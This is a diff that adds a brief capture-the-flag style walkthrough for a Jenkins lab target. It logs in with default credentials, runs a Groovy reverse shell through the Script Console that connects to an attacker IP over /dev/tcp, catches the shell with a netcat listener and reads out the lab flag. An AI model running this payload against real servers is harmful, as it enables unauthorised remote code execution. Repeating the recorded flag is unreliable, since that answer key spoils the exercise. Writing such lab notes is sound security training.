@@ -1,1 +1,16 @@
+Question 1 - Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory 
+
+1) navigate to http://jenkins.inlanefreight.local:8000 and login with the credentials admin:admin
+2) click on "Manage Jenkins"
+3) find "Script Console" and click on it
+4)  Groovy script reverse-shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.252/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+5) launch nc listener 
+6) catch shell -> 
+
+cat flag.txt
+
+f33ling_gr00000vy!
 
